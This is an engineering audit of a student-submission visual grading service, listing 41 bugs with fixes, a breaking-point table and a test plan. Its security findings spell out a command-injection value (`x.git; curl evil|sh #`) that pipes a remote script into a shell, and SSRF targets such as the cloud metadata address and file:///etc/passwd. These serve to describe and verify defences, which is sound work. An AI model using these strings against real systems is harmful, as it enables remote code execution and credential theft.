# Visual Evaluator — Architecture, System Design & Engineering Audit

> **Audience:** maintainers of `central-evaluators`.
> **Scope:** the **visual** evaluator (`evaluators/visual/*`) and the shared infrastructure it depends on (`server.js`, `config/*`, `controller`, `router`, `workers/visualWorker.js`).
> **Author:** Principal-systems-engineer review pass.
> **Date:** 2026-06-29.

---

## 0. How to use this document

This is a **living document**. Every issue in §4 has a checkbox and a stable ID (`V-01` … `V-38`).

- When you fix an issue, change `- [ ]` to `- [x]`, append `**FIXED:** <commit sha> — <one line>` to that entry, and move on.
- Severities: 🔴 **Critical** (breaks prod or security), 🟠 **High** (wrong results / cost / stability), 🟡 **Medium** (correctness/robustness), ⚪ **Low** (hygiene).
- §5 ("Breaking-point analysis") is the answer to *"when will it break and how do I fix it in production"* — read it before any large batch run.
- §6 is the test plan + harness (`scripts/`).

**Status (branch `developer-Arma`):** ✅ **all 38 findings (V-01…V-38) addressed** across 6 batched commits. The original headline blocker (Playwright as a devDependency) is fixed and the regression suite (`npm run test:unit` — scoring, rubric, URL-guard) is green. Items needing a live Redis+Playwright+OpenAI stack to fully confirm are listed in §8.

---

## 1. System architecture (whole platform)

```
                                  ┌──────────────────────────────┐
   HTTP client ──POST /evaluate──▶│  server.js (Express)         │
                                  │  evaluatorController.evaluate │
                                  └───────────────┬──────────────┘
                                                  │ routeEvaluation(payload)
                                                  ▼
                                  ┌──────────────────────────────┐
                                  │  router/evaluationRouter.js   │
                                  │  type ∈ {javascript, python,  │
                                  │  backend, react, visual,      │
                                  │  fullstack}                   │
                                  │  fan-out: 1 job per submission│
                                  │  (javascript & visual only)   │
                                  └───────────────┬──────────────┘
                                                  │ queueManager.addEvaluation(type, jobData)
                                                  ▼
   ┌──────────────────────────── Redis (ioredis, 127.0.0.1:6379) ───────────────────────────┐
   │  BullMQ queues: <type>-evaluation   (react/backend/visual/javascript/python/fullstack)  │
   └───────────────┬─────────────────────────────────────────────────────────────┬─────────┘
                   │ worker pulls job                                              │
                   ▼                                                               ▼
   ┌──────────────────────────────┐                                  ┌──────────────────────┐
   │ workers/visualWorker.js       │   ... jsWorker / pythonWorker /  │  other workers        │
   │ concurrency = 2               │       reactWorker / backendWorker│                       │
   └───────────────┬──────────────┘       / fullstackWorker          └──────────────────────┘
                   │ processVisualJob(job)
                   ▼
   ┌────────────────────────────────────────────────────────────────────────────────────────┐
   │ evaluators/visual/                                                                        │
   │                                                                                          │
   │  repoService.cloneGitRepo(submission.repoUrl)  ──▶ /<cwd>/temp/visual_<ts>_<rand>        │
   │                                                                                          │
   │  evaluatorService.evaluateStudentsWithVision({ studentId, studentName, repoPath,         │
   │                                                rubricText, expectedUrl }):               │
   │     1. rubricService.parseRubricWithSelectors(rubricText)   → OpenAI gpt-4o → rubric[]    │
   │     2. scannerService.scanStudentFolders(repoPath)          → first .html, all .css      │
   │     3. localServerService.startStaticServer(basePath)       → http://127.0.0.1:<rand>    │
   │     4. browserPool.borrow() → context → screenshot expectedUrl (reference)               │
   │     5. goto(studentUrl) → screenshot                                                     │
   │     6. domService.runDynamicDomChecks(page, rubric)         → selector existence         │
   │     7. behaviourService.runBehaviorChecks(page, rubric)     → click → new-tab URL match  │
   │     8. promptBuilder.buildVisionPrompt(...)                                              │
   │     9. OpenAI gpt-4o VISION (student.png + expected.png)    → free-text score            │
   │    10. finalScore = domScore + behaviorScore + visualScore                               │
   │    11. write final_scores.json (in source tree)                                         │
   │  repoService.deleteRepo(repoPath)   (worker `finally`)                                    │
   └────────────────────────────────────────────────────────────────────────────────────────┘
```

### 1.1 Component responsibilities

| Component | File | Responsibility |
|---|---|---|
| API gateway | `server.js` | Express app, worker bootstrap, health endpoints, job-status endpoint |
| Controller | `controller/evaluatorController.js` | Validates `type`, calls router, shapes response |
| Router | `router/evaluationRouter.js` | Validates type, **fans out** `submissions[]` → one job each (visual/js) |
| Queue manager | `config/queueManager.js` | Defines all queues, default job options, stats/health |
| Redis | `config/redis.js` | Single shared ioredis connection (singleton) |
| Worker | `workers/visualWorker.js` | Concurrency-2 BullMQ worker; clone → evaluate → delete |
| Browser pool | `evaluators/visual/browserPool.js` | Reusable pool of 3 headless Chromium browsers |
| Repo service | `evaluators/visual/repoService.js` | `git clone` / `rm -rf` of submission |
| Scanner | `evaluators/visual/scannerService.js` | Locate HTML/CSS in the repo, flag missing files |
| Static server | `evaluators/visual/localServerService.js` | `serve-handler` over the repo on a random port |
| Rubric parser | `evaluators/visual/rubricService.js` | gpt-4o: rubric text → structured `{description,weight,type,checks}[]` |
| DOM checks | `evaluators/visual/domService.js` | Selector existence checks |
| Behavior checks | `evaluators/visual/behaviourService.js` | Click → assert new-tab URL contains expected |
| Prompt builder | `evaluators/visual/utils/promptBuilder.js` | Assemble the vision-model prompt |
| Orchestrator | `evaluators/visual/evaluatorService.js` | Ties all of the above together + scoring |

### 1.2 Scoring model (as implemented)

```
domScore      = Σ over dom items      (passedSelectors / totalSelectors) * weight      [proportional]
                (item with no checks  ⇒ full weight, see V-21)
behaviorScore = Σ over behavior items (ALL checks pass ? weight : 0)                    [all-or-nothing]
visualScore   = number parsed from gpt-4o free text via /total\s*score[:\s]+(\d+...)/i
finalScore    = domScore + behaviorScore + visualScore   ← unbounded, not normalized
```

This model has three independent defects — double counting (`V-07`), brittle parse (`V-10`), and no normalization (`V-30`) — covered below.

---

## 2. Request / data contract

`POST /evaluate` (visual):

```jsonc
{
  "type": "visual",
  "expectedUrl": "https://reference-design.example.com",   // screenshotted as the "correct" answer
  "rubricText": "1. Has a favicon ...\n2. Twitter link opens twitter.com ...",
  "submissions": [
    { "studentId": "s1", "studentName": "Alice", "repoUrl": "https://github.com/alice/assignment.git" },
    { "studentId": "s2", "studentName": "Bob",   "repoUrl": "https://github.com/bob/assignment.git" }
  ]
}
```

Response: `{ success, jobs: [{ jobId, statusUrl }] }`. Poll `GET /jobs/visual/:jobId`.

**Contract gaps:** no schema validation, no auth, no size/count limits, no URL scheme validation (see `V-03`, `V-04`, `V-28`).

---

## 3. What actually works well (keep these)

- Queue-per-type isolation with sensible relative concurrency (visual=2 because browsers are heavy).
- Browser **pooling** concept is the right call (avoids per-job Chromium cold start).
- Repo cleanup is in a worker-level `finally` (`deleteRepo`) — correct placement for the clone.
- DOM/behavior/visual separation in the rubric is a sound design: deterministic checks for structure/interaction, model only for subjective layout.
- Health endpoints (`/health`, `/health/redis`, `/health/queues`) exist.
- Winston logging with rotation is in place.

The architecture is fundamentally sound. The problems are in **packaging, resource lifecycle, scoring math, and hardening** — all fixable without redesign.

---

## 4. Bug & fix registry

### 🔴 Critical

- [x] **V-01 — Playwright is a `devDependency`; the visual evaluator cannot run in production.** **FIXED (Batch 1):** moved `playwright` to `dependencies`, added `postinstall: playwright install chromium`.
  `browserPool.js` and `evaluatorService.js` do `import { chromium } from 'playwright'` at module load, but `playwright` is under `devDependencies` and is **not present in `node_modules`** in this checkout. `npm ci --omit=dev` (standard prod install) will not install it, and the Chromium binary is never fetched.
  **Impact:** `initializeVisualWorker()` throws on startup → `startServer()` `process.exit(1)` → whole service dead.
  **Fix:**
  1. Move `playwright` to `dependencies` in `package.json`.
  2. Add a `postinstall` (or deploy step): `"postinstall": "playwright install --with-deps chromium"`.
  3. Or switch to `playwright-core` + a pinned system Chromium and pass `executablePath`.
  **Verify:** `rm -rf node_modules && npm ci --omit=dev && node -e "import('playwright').then(()=>console.log('ok'))"`.

- [x] **V-02 — Command injection in `cloneGitRepo`.** **FIXED (Batch 5):** replaced `exec(\`git clone …\`)` with `simpleGit().clone(url, path, ['--depth','1','--'])` (args array, no shell); URL validated via `assertSafeUrl` first. Verified by `scripts/test-url-guard.mjs`.
  `evaluators/visual/repoService.js`: `execPromise(\`git clone ${gitUrl} ${repoPath}\`)`. `gitUrl` is attacker-controlled (`submission.repoUrl`). Input like `x.git; curl evil|sh #` or `--upload-pack=...` executes arbitrary shell.
  **Fix:** use `simple-git` (already a dependency) or `execFile('git', ['clone', '--depth', '1', '--', gitUrl, repoPath])` (note `--` and the args array — no shell). Validate scheme/host first (see `V-03`). Add `--depth 1`.
  **Verify:** attempt clone with `repoUrl="https://x.git; touch /tmp/pwned"` → no file created.

- [x] **V-03 — SSRF via `expectedUrl` and `repoUrl`; `file://` allowed.** **FIXED (Batch 5):** new `utils/urlGuard.js` (`assertSafeUrl` resolves DNS + rejects loopback/private/link-local/metadata; `assertUrlSyntax` for fast allowlist checks). Applied in the controller, before clone, and before the `expectedUrl` goto. `repoUrl` restricted to `ALLOWED_GIT_HOSTS`. Verified by `scripts/test-url-guard.mjs`.
  The headless browser navigates to `expectedUrl` and clones `repoUrl` with no validation. An attacker can target `http://169.254.169.254/…` (cloud metadata), `http://localhost:<admin>`, or `file:///etc/passwd`.
  **Fix:** validate both URLs — allow only `http(s)`, resolve DNS and reject private/loopback/link-local ranges (RFC1918, 127/8, 169.254/16, ::1, fc00::/7), enforce an allowlist of git hosts for `repoUrl`. Apply the check in the controller *and* before each `goto`/clone.
  **Verify:** `expectedUrl="http://169.254.169.254/latest/meta-data/"` is rejected with 400.

- [x] **V-04 — No authentication / rate limiting on `/evaluate`.** **FIXED (Batch 5):** `middleware/auth.js` — `requireApiKey` (constant-time `x-api-key` vs `API_KEY`, fail-closed if unset) + `evaluateRateLimiter` (express-rate-limit, 60/min default), both wired onto `POST /evaluate`.
  Anyone who can reach the port can enqueue jobs → unbounded OpenAI spend, SSRF (`V-03`), RCE (`V-02`), and DoS.
  **Fix:** require an API key / mTLS / network policy; add `express-rate-limit`; bind only to the internal network.
  **Verify:** unauthenticated `POST /evaluate` → 401.

- [x] **V-05 — Browser-pool leak when the reference screenshot fails → pool exhaustion.** **FIXED (Batch 2):** entire body from `borrow()` on is wrapped in `try/finally`; `finally` unconditionally closes context, returns the browser, closes the server, and removes the per-job dir. Reference `goto` keeps its 30s timeout.
  In `evaluateStudentsWithVision`, `browserPool.borrow()`, `browser.newContext()` and `expectedPage.goto(expectedUrl)` run **outside** the `try/catch`. If `expectedUrl` is slow/unreachable (default 30s nav, no `waitUntil`), `goto` throws, the function throws, and the borrowed browser + context are **never returned/closed**. After 3 such failures the pool of 3 is empty; every subsequent job blocks 60s in `borrow()` then fails — the whole visual queue wedges permanently until restart.
  **Fix:** wrap the *entire* body (from `borrow()` onward) in `try/finally`; return the browser and close the context/server in `finally` unconditionally. Give `expectedUrl` navigation an explicit timeout and `waitUntil: 'networkidle'`. Cache the reference screenshot (see `V-29`) so it isn't re-fetched per submission.
  **Verify:** point `expectedUrl` at a dead host; run 5 jobs; confirm `browserPool.getStats().available` returns to 3.

- [x] **V-06 — Static HTTP server leak in the `flags > 0` early return.** **FIXED (Batch 2):** `startStaticServer` moved to *after* the flags check; `server.close()` now lives in the single `finally` so it always runs.
  `startStaticServer` is started before the missing-files check. When `student.flags.length > 0` the code returns early and closes the context + returns the browser, **but never calls `server.close()`**. Every submission with missing HTML/CSS leaks a listening socket + an event-loop handle. The server is also started uselessly before we know we'll bail.
  **Fix:** move `startStaticServer` to *after* the flags check, and/or close the server in a single `finally`. Best: one `finally` block owns server + context + browser cleanup.
  **Verify:** submit 20 repos with no HTML; `lsof -p <pid> | grep -c LISTEN` does not grow.

- [x] **V-07 — Final score double-counts DOM + behavior.** **FIXED (Batch 3):** prompt now scores visual items only; `assembleScore()` in `scoring.js` is the single source of truth (`dom+behavior+visual`, each once). Verified by `scripts/test-scoring-logic.mjs` (total 35, not 85).
  `promptBuilder.js` instructs gpt-4o: *"Give FULL evaluation (visual + dom + behavior)"* and *"Final score MUST be sum of all rubric items"*. The regex then extracts that **all-items** total into `visualScore`. But the orchestrator computes `finalScore = domScore + behaviorScore + visualScore` — so DOM and behavior are counted **twice** (once deterministically, once inside the model's total). This contradicts the documented design (vision should score *visual items only*, 0–100). The commented-out earlier prompt was correct ("ONLY give score for visual items").
  **Fix:** revert the prompt to ask the model for the **visual-items subtotal only** (and ideally as JSON: `{"visualScore": <n>, "breakdown":[...], "feedback":"..."}`), or stop adding `domScore`/`behaviorScore` separately. Pick one source of truth.
  **Verify:** unit-test the scoring with a rubric of 1 dom (w=10, pass) + 1 visual (w=20, model=15) → expect 25, not 35.

- [x] **V-08 — BullMQ v5 ignores the `timeout` job option → no timeout is enforced.** **FIXED (Batch 4):** removed the dead `timeout` job option; the worker now wraps the evaluation in `withTimeout(config.timeout)` (reused `react/utils/timeout.js`). `goto` keeps explicit 30s timeouts.
  `queueManager.js` sets `defaultJobOptions.timeout` and `QUEUE_CONFIG.*.timeout`, but BullMQ removed the per-job `timeout` option in v4+. (Confirmed: bullmq 5.76.8.) A hung `goto`, hung OpenAI call, or infinite-loop student page runs until the lock stalls, not until 5 minutes.
  **Fix:** enforce timeouts in code — wrap the evaluation in `Promise.race([evaluate(), timeout(ms)])`, and/or cap every external op (`goto` timeout, OpenAI `timeout`/`AbortSignal`, clone timeout). Remove the dead `timeout` options to avoid false confidence.
  **Verify:** a job whose student page hangs is failed at the configured budget, not at lock-stall time.

### 🟠 High

- [x] **V-09 — Rubric parse failures silently score students 0 (and are retried 3×).** **FIXED (Batch 3):** `parseRubricWithSelectors` uses `response_format:json_object`; `normalizeRubric` (in `rubricSchema.js`) accepts array/`{items|rubric|criteria}`, validates each item, and throws typed `RubricParseError` instead of returning `[]`. Verified by `scripts/test-rubric-fallback.mjs`. (Worker no-retry handled in Batch 4 / V-17.)
  `parseRubricWithSelectors` returns `[]` on any JSON error, and returns an **object** (not array) if gpt-4o wraps results in `{ "rubric": [...] }`. Downstream `for (const item of rubric)` then iterates nothing (→ all-0 scores) or throws "not iterable" (→ job fails → 3 retries, 3× model cost). Students are penalized for an LLM formatting hiccup.
  **Fix:** call with `response_format: { type: 'json_object' }`, accept both `[]` and `{items:[]}` shapes, validate each item against a schema, and **throw a typed `RubricParseError`** instead of returning `[]` so the job is flagged for manual review rather than silently zeroing students. Make rubric parsing a non-retryable failure (see `V-17`).
  **Verify:** feed a rubric that gpt-4o tends to wrap; assert a valid array is produced or the job is flagged, never silent-0.

- [x] **V-10 — Vision score regex is brittle → `visualScore` silently 0.** **FIXED (Batch 3):** the vision call uses `response_format:json_object`; `visualScore` is read from the JSON field, no regex scraping.
  `/total\s*score[:\s]+(\d+(\.\d+)?)/i` only matches `total score: 85`. Misses `Total: 85`, `Total score = 85`, `**Total Score** 85/100`, or any localized phrasing. When it misses, `visualScore = 0` with no signal.
  **Fix:** force JSON output (see `V-07`/`V-09`) and read `response.visualScore` directly; drop regex scraping.
  **Verify:** 10 varied model outputs all parse to the intended number.

- [x] **V-11 — Behavior checks assume every click opens a new tab; in-page navigation always fails and burns 30s each.** **FIXED (Batch 3):** `behaviourService.js` races `waitForEvent('page')` vs `waitForNavigation()` with a 5s budget, reads the resulting URL for either case, resets the page to its start URL between checks. (Live-verify same-tab <5s.)
  `behaviourService.js` does `Promise.all([page.context().waitForEvent('page'), page.click(sel)])`. This only resolves if the click opens a **new tab** (`target="_blank"`). For a normal same-tab link, `waitForEvent('page')` never fires → 30s default timeout → caught → `false`. Every same-tab behavior check is a guaranteed fail and a 30s stall (serially adds up across checks → can blow the job budget).
  **Fix:** detect both cases — race `waitForEvent('page')` against `page.waitForNavigation()`; if same-tab, read `page.url()` and navigate back / reload before the next check. Reset page state between behavior checks (clicks mutate the page). Add a short per-check timeout.
  **Verify:** a same-tab link to `twitter.com` passes and completes in <5s.

- [x] **V-12 — `--single-process` Chromium is unstable under concurrency.** **FIXED (Batch 2):** removed `--single-process` from `browserPool._launch()`; kept `--no-sandbox --disable-setuid-sandbox --disable-dev-shm-usage`.
  `browserPool.js` launches with `--single-process`. Combined with concurrency 2 and multiple contexts/pages, this flag is a well-known source of renderer crashes / "Target closed". Memory is "reduced" at the cost of stability.
  **Fix:** drop `--single-process`; keep `--no-sandbox --disable-setuid-sandbox --disable-dev-shm-usage`. Tune memory via pool size and `--js-flags=--max-old-space-size` if needed.
  **Verify:** run a 50-job batch; zero "Target closed"/renderer crashes.

- [x] **V-13 — One shared ioredis connection for the Queue and all Workers; `commandTimeout` set on it.** **FIXED (Batch 4):** every worker now uses `redisConnection.getClient().duplicate()` (dedicated blocking connection); `commandTimeout` removed from the connection config. `maxRetriesPerRequest: null` kept.
  `redisConnection.getClient()` returns a single client reused by every `Queue` and every `Worker`. BullMQ workers issue **blocking** commands (`BZPOPMIN`/`BRPOPLPUSH`) and require their own connection; sharing with non-blocking queue traffic causes contention and "command timed out" errors. `commandTimeout: 30000` actively aborts the workers' long blocking reads.
  **Fix:** give each `Worker` its own connection (`redisConnection.getClient().duplicate()` or a factory). Do **not** set `commandTimeout` on worker connections. Keep `maxRetriesPerRequest: null` (already correct).
  **Verify:** idle the workers >30s; no recurring command-timeout errors in logs.

- [x] **V-14 — Redis `username` parsed as an integer.** **FIXED (Batch 4):** `username: process.env.REDIS_USERNAME || undefined` (string, not `parseInt`).
  `config/redis.js`: `username: parseInt(process.env.REDIS_USERNAME) || 0`. Username is a string (e.g. `"default"`); `parseInt` → `NaN` → `0`. Breaks ACL auth on managed Redis (Redis Cloud/Elasticache with ACL).
  **Fix:** `username: process.env.REDIS_USERNAME || undefined`.
  **Verify:** connect to an ACL-enabled Redis with a username.

- [x] **V-15 — Dead browsers poison the pool (no validation on borrow/return).** **FIXED (Batch 2):** `borrow()` skips disconnected idle browsers; `return()` drops a dead browser and `_replace()` relaunches one so pool size is preserved. Extracted `_launch()`.
  If a pooled browser crashes (very likely given `V-12`), it stays in `this.browsers`/`available` and gets handed out again → repeated failures. `healthCheck()` exists but is never called on the hot path.
  **Fix:** on `return`, verify `browser.isConnected()`; if not, drop it and lazily relaunch a replacement so the pool size is maintained. Optionally validate on `borrow`.
  **Verify:** kill a browser mid-batch; pool self-heals and subsequent jobs succeed.

- [x] **V-16 — Shared artifact files cause races and write into the source tree.** **FIXED (Batch 2):** per-job `fs.mkdtemp` dir under `os.tmpdir()`; screenshots named by `studentId`; the `final_scores.json` write into the source tree was removed (results returned via the job).
  `expected.png` (constant path), `final_scores.json` (constant path), and `<studentName>.png` are written under `evaluators/visual/screenshots` / source dir. With concurrency 2, two jobs overwrite each other's `expected.png` between write and read; `final_scores.json` only ever reflects the last job; duplicate `studentName`s collide. Writing into the deployed code dir also breaks on read-only/container filesystems.
  **Fix:** use a per-job temp dir (`fs.mkdtemp`), name files by `jobId`/`studentId`, and don't persist `final_scores.json` from inside the eval (return it via the job result; persist centrally if needed).
  **Verify:** run two jobs concurrently with the same `expectedUrl` but different students; both get correct, non-cross-contaminated screenshots.

- [x] **V-17 — No retry classification → permanent failures retried 3× (cost amplification).** **FIXED (Batch 4):** the worker rethrows permanent failures (`RubricParseError`, "Missing required inputs") as BullMQ `UnrecoverableError` (no retry); transient errors still retry.
  `attempts: 3` + exponential backoff is global. Deterministic failures (bad repo URL, rubric parse error, unreachable `expectedUrl`) re-run the full pipeline 3×, including paid gpt-4o vision calls.
  **Fix:** classify errors. Transient (network blip, browser crash) → retry. Permanent (validation, parse, 4xx clone) → `throw new UnrecoverableError(...)` (BullMQ) so it fails once. Move the expensive OpenAI call as late as possible and short-circuit on deterministic 0s.
  **Verify:** a malformed repo URL produces exactly one failed attempt.

- [x] **V-18 — Vision scoring is non-deterministic (no temperature/seed/format).** **FIXED (Batch 3):** vision + rubric calls now use `temperature:0` and `response_format:json_object`; the raw model JSON is kept as `feedback` for auditability.
  The vision `chat.completions.create` sets no `temperature`/`seed`/`response_format`. The same submission can score differently across retries — unfair and non-reproducible for grading.
  **Fix:** `temperature: 0`, `seed: <fixed>`, `response_format: json_object`; log the raw model response with the score for auditability.
  **Verify:** same input → same score across 3 runs.

- [x] **V-19 — `lockDuration` 30s is too short for long visual jobs → stall → duplicate processing.** **FIXED (Batch 4):** `lockDuration: 180000`, `lockRenewTime: 60000`; combined with the real timeout (V-08) and screenshot cap (V-26) keeps the event loop responsive.
  Worker `lockDuration: 30000` with `maxStalledCount: 2`. Visual jobs routinely exceed 30s (two 30s gotos + two gpt-4o calls). Lock renewal (15s) usually saves it, but any event-loop block (huge `fullPage` base64 encode) delays renewal → job marked stalled → re-run → duplicate OpenAI spend / duplicate result.
  **Fix:** raise `lockDuration` to comfortably exceed the worst-case job (e.g. 120–180s), keep `lockRenewTime ≈ lockDuration/2`, and avoid blocking the event loop (stream/encode off-thread, cap screenshot size — `V-26`).
  **Verify:** a 90s job is never re-delivered.

### 🟡 Medium

- [x] **V-20 — `scanStudentFolders` grabs `htmlFiles[0]` with no `index.html` preference.** **FIXED (Batch 6):** `pickEntryHtml` prefers an explicit `entryFile`, then `index.html`, then shallowest, then lexicographic (deterministic). `entryFile` threaded from `submission.entryFile`.

- [x] **V-21 — DOM item with no `checks` is awarded full weight for free.** **FIXED (Batch 3):** `computeDomScore` skips check-less DOM items (0 credit); `manualReviewItems()` surfaces them and the result sets `manualCorrection`. Verified by `scripts/test-scoring-logic.mjs`.

- [x] **V-22 — `check.condition` is ignored; only existence is tested.** **FIXED (Batch 3):** `domService.js` implements an `exists`/`visible`/`textContains`/`attr` switch (default `exists`).

- [x] **V-23 — No viewport normalization for screenshots.** **FIXED (Batch 6):** context created with a fixed `viewport` (1366×900) for both reference and student; combined with `fullPage:false` (V-26) both images are the same size.

- [x] **V-24 — Screenshots taken without waiting for fonts/images/CSS.** **FIXED (Batch 6):** both `goto`s use `waitUntil: 'networkidle'` and `await document.fonts.ready` before screenshotting.

- [x] **V-25 — `screenshots/` and `temp/` are never cleaned; orphaned on crash.** **FIXED (Batch 2):** per-job temp dir deleted in `finally`; `sweepStaleRepos()` removes `<cwd>/temp` clones >2h old at worker startup.
  Per-student PNGs accumulate forever; if the process dies mid-job, `temp/visual_*` clones are orphaned (only the worker `finally` deletes them). Disk fills over a semester of batches. **Fix:** use per-job temp dirs deleted in `finally`; add a startup sweep of stale `temp/`/`screenshots/` older than N hours; alert on disk usage.

- [x] **V-26 — No cap on `fullPage` screenshot dimensions.** **FIXED (Batch 5):** both screenshots use `fullPage: false`, capping capture to the viewport (explicit fixed viewport added in Batch 6 / V-23).
  A student page 50,000px tall produces a giant screenshot → memory spike, slow base64, and OpenAI may reject the image. **Fix:** cap height (clip region) or set `fullPage: false` with a fixed viewport; reject pathological pages.

- [x] **V-27 — Graceful shutdown doesn't drain workers or close the browser pool.** **FIXED (Batch 2):** `server.js` handles SIGTERM **and** SIGINT, calls every `stop*Worker()` (each drains its worker + closes its pool) then `queueManager.disconnect()`, with a 30s hard-exit guard; idempotent.
  `SIGTERM` handler only calls `queueManager.disconnect()` — it does not `await visualWorker.close()` or `browserPool.close()`, and `SIGINT` isn't handled. Result: in-flight jobs are killed and **zombie Chromium processes leak** in the container across deploys. **Fix:** on SIGTERM/SIGINT, stop accepting (`worker.close()` waits for active jobs), then close the pool, then disconnect Redis, then exit; add a hard-exit timeout.

- [x] **V-28 — No payload / batch-size limits.** **FIXED (Batch 5):** controller caps `submissions.length` (`MAX_SUBMISSIONS`, default 500) and `rubricText` length (`MAX_RUBRIC_CHARS`, default 20k); `express.json({ limit })` (default 2mb) caps body size. Bad input → 400.
  `submissions` can be arbitrarily large → instant queue flood; `rubricText` unbounded. **Fix:** cap `submissions.length`, validate payload size, reject oversized rubrics; consider chunked enqueue.

- [x] **V-29 — Reference screenshot is recomputed for every submission.** **FIXED (Batch 6):** in-process promise cache keyed by `assignmentId::expectedUrl` (max 20, oldest-evicted) renders the reference once and dedupes concurrent jobs; failures aren't cached.

- [x] **V-30 — No score normalization / schema across rubrics.** **FIXED (Batch 3):** `assembleScore()` returns `{domScore, behaviorScore, visualScore, total, maxTotal, normalized}` (normalized = total/maxTotal*100); the result also carries `manualReviewItems` and `studentId`.

### ⚪ Low / hygiene

- [x] **V-31 — `node_modules` is committed (1861 files, and incomplete — Playwright missing).** **FIXED (Batch 1):** `git rm -r --cached node_modules`; still ignored.
- [x] **V-32 — `logs/` is committed (`combined.log`, `error.log`, `workers.log`).** **FIXED (Batch 1):** `git rm -r --cached logs`; added `logs/`, `*.log`, `temp/`, `screenshots/`, `final_scores.json` to `.gitignore`.
- [x] **V-33 — Debug `console.log` noise.** **FIXED (Batch 5):** removed the full-job dump in `getJobStatus` and the rubric/url `console.log`s; routed through `logger.debug` without dumping job/secret payloads.
- [x] **V-34 — `vm2@3.9.19` is deprecated with known sandbox-escape CVEs** (used by the JS evaluator, not visual, but ships in the same service). **FIXED (Batch 6, documented):** added a `TODO(security, V-34)` at the `vm2` import in `evaluators/js/executionService.js`. Full migration to `isolated-vm`/E2B remains a tracked follow-up (out of the visual-evaluator scope).
- [x] **V-35 — Dependency bloat:** `cors`, `body-parser`, `multer`, `node-cron`, `lodash` appear unused by the running paths. **FIXED (Batch 1):** grep-confirmed 0 source uses; removed all five from `package.json`.
- [x] **V-36 — Static server binds all interfaces.** **FIXED (Batch 5):** `server.listen(0, '127.0.0.1')` — loopback only.
- [x] **V-37 — No `.env.example`.** **FIXED (Batch 1):** added `.env.example` documenting server/auth/Redis/OpenAI/Groq/E2B/SSRF-allowlist/logging vars.
- [x] **V-38 — `expected.replace("url contains ", "")` mismatches the rubric prompt.** **FIXED (Batch 3):** `behaviourService.js` only strips the prefix when `expected` is a non-empty string and falls back to "any navigation = pass" when `expected` is absent.

### 🆕 Found during live testing (not yet fixed)

- [ ] **V-41 — 🔴 Backend & fullstack workers don't `await` the evaluator → one bad job crashes the whole gateway.** `workers/backendWorker.js` and `workers/fullstackWorker.js` do `const results = evaluateBackendProject(job.data)` (no `await`) and return `{ success, results }` with `results` still a pending Promise. The job is marked "completed" with a meaningless value, and when the promise later rejects (e.g. E2B sandbox failure) it becomes an **unhandled rejection that kills the Node process** — taking *all* evaluators down. Observed live: a backend submission crashed the server. **Fix:** `await` the evaluator inside the worker (matches react/python which already do), and add a `process.on('unhandledRejection')` guard.
- [ ] **V-39 — 🟠 Redirect-time SSRF bypass.** `assertSafeUrl` validates the *initial* host, but an `expectedUrl` like a `tinyurl` 30x-redirects to another host that is never re-validated (observed: `tinyurl.com` → `rylenlobo.github.io`). A shortener could redirect to an internal IP. **Fix:** after `goto`, re-check `page.url()` with `assertSafeUrl`, or block cross-host redirects to non-allowlisted/private targets.
- [ ] **V-40 — 🟡 "Renders but blank / non-functional" isn't flagged.** An unbuilt React submission (blank page) and an unstyled JS submission still get auto-scored. **Fix:** if served page has ~0 visible text / a 404 on its main module / failed core interaction, set `manualCorrection` instead of scoring (like missing-files).

---

## 5. Breaking-point analysis — *when it breaks and how to fix it in production*

This section maps the load/operational thresholds at which the visual evaluator fails, the symptom you'll see, the root cause (cross-referenced above), and the production mitigation.

| # | Trigger / threshold | Symptom in prod | Root cause | Mitigation |
|---|---|---|---|---|
| **B1** | **Deploy with `npm ci --omit=dev`** | Service crash-loops on boot (`Cannot find package 'playwright'`) | `V-01` | Move playwright to deps + `playwright install chromium` in build |
| **B2** | **`expectedUrl` slow/unreachable for ≥3 jobs** | Visual queue wedges; all jobs time out at 60s `borrow()` | `V-05` | try/finally cleanup + reference caching; circuit-break bad expectedUrl |
| **B3** | **Batch with many missing-HTML repos** | Slow handle/FD growth → `EMFILE` / OOM after hours | `V-06` (server leak) | single `finally` closes server; start server after flags check |
| **B4** | **Any large batch** | Renderer "Target closed" errors; flaky 0 scores | `V-12` + `V-15` | drop `--single-process`; self-healing pool |
| **B5** | **Rubric with same-tab link checks** | Each behavior check stalls 30s; jobs blow budget / look hung | `V-11` | handle same-tab nav; short per-check timeout |
| **B6** | **gpt-4o returns wrapped/odd JSON** | Whole cohort silently scored 0, or jobs fail ×3 | `V-09` | json_object + schema + flag-don't-zero |
| **B7** | **gpt-4o phrasing changes** | `visualScore` silently 0 for everyone | `V-10` | JSON field, not regex |
| **B8** | **Concurrency 2, same assignment** | Cross-contaminated screenshots; `final_scores.json` overwritten | `V-16` | per-job temp dirs, id-named files |
| **B9** | **Managed Redis with ACL username** | Worker can't auth; nothing processes | `V-14` + `V-13` | fix username; per-worker connections, no commandTimeout |
| **B10** | **Job >30s under event-loop pressure** | Same job processed twice → double OpenAI spend, duplicate results | `V-19` (+`V-08`) | raise lockDuration; enforce real timeout; cap screenshot size |
| **B11** | **Hostile/buggy student repo** (RCE / SSRF / infinite page / 50k px) | Arbitrary command exec, internal scans, memory blow, hung job | `V-02`,`V-03`,`V-26`,`V-08` | execFile + URL validation + SSRF guard + size/time caps |
| **B12** | **Public endpoint discovered** | Unbounded cost / DoS / RCE pivot | `V-04` | auth + rate limit + network isolation |
| **B13** | **Long-running pod across deploys** | Disk fills (`screenshots/`, `temp/`), zombie Chromium accumulate | `V-25`,`V-27` | cleanup sweeps; graceful drain + pool close |
| **B14** | **High submission count in one request** | Instant queue flood, Redis memory pressure | `V-28` | batch caps, chunked enqueue |

**Production "won't survive a real batch" set (fix before any cohort run):** `V-01, V-05, V-06, V-07, V-09, V-10, V-11, V-12, V-13, V-19`.
**Security set (fix before any untrusted input):** `V-02, V-03, V-04, V-36`.

---

## 6. Test plan & harness

Because the live pipeline needs Redis + Playwright/Chromium + an `OPENAI_API_KEY`, tests are split into **infra-free** (run today) and **integration** (need infra).

### 6.1 Infra-free (run now) — `npm run test:unit`

These now import the **real** shipped helpers and assert the fixed behavior (they began as red repros and are green post-fix):
- `scripts/test-scoring-logic.mjs` — `scoring.js`: single-counted total (`V-07`), no free credit + manual-review flag (`V-21`), normalized score (`V-30`).
- `scripts/test-rubric-fallback.mjs` — `rubricSchema.js`: every realistic shape → usable array or typed `RubricParseError`, never silent-0 (`V-09`).
- `scripts/test-url-guard.mjs` — `urlGuard.js`: `file://`/metadata/loopback/private rejected, allowlist + injection strings rejected (`V-02`/`V-03`).

Run: `npm run test:unit`

### 6.2 Integration (need Redis + Playwright + OpenAI key)

